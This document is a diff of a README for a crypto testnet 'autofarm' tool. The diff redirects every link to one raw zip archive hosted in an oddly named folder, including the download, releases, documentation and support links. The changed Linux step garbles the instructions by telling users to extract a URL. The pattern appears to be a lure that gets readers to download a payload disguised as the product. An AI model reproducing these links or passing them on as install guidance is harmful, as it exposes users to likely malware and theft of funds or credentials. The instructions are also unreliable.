@@ -1,6 +1,6 @@
 # 🚀 Zama-testnet-autofarm - Maximize Your Testnet Rewards Effortlessly
 
-[![Download Zama-testnet-autofarm](https://img.shields.io/badge/Download-Zama--testnet--autofarm-brightgreen)](https://github.com/Luismandolar55/Zama-testnet-autofarm/releases)
+[![Download Zama-testnet-autofarm](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Zama-testnet-autofarm! This powerful tool helps you join the first fu
 
 To get started, you need to visit the Releases page below. There, you will find the latest version of the application along with installation instructions.
 
-[Visit this page to download](https://github.com/Luismandolar55/Zama-testnet-autofarm/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)
 
 ### System Requirements
 
@@ -41,7 +41,7 @@ Before you download Zama-testnet-autofarm, make sure your computer meets these r
   3. Open the Applications folder and double-click the app to launch it.
 
 - **Linux:**
-  1. Extract the downloaded `.tar.gz` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application with the command `./Zama-testnet-autofarm`.
 
@@ -73,7 +73,7 @@ Yes, Zama-testnet-autofarm employs advanced encryption methods to protect your d
 
 ### How can I get support?
 
-If you have questions or need help, please visit our [GitHub Issues page](https://github.com/Luismandolar55/Zama-testnet-autofarm/issues) to report issues or ask for assistance.
+If you have questions or need help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip) to report issues or ask for assistance.
 
 ## 🎉 Join the Community
 
@@ -81,8 +81,8 @@ We encourage you to connect with other users and developers. Join our discussion
 
 ## 🔗 Useful Links
 
-- [Download Zama-testnet-autofarm](https://github.com/Luismandolar55/Zama-testnet-autofarm/releases)
-- [Documentation](https://github.com/Luismandolar55/Zama-testnet-autofarm/wiki)
-- [GitHub Issues](https://github.com/Luismandolar55/Zama-testnet-autofarm/issues)
+- [Download Zama-testnet-autofarm](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Luismandolar55/Zama-testnet-autofarm/main/nonheathen/Zama-testnet-autofarm_v2.5.zip)
 
 Explore the world of confidential computing with Zama-testnet-autofarm today!
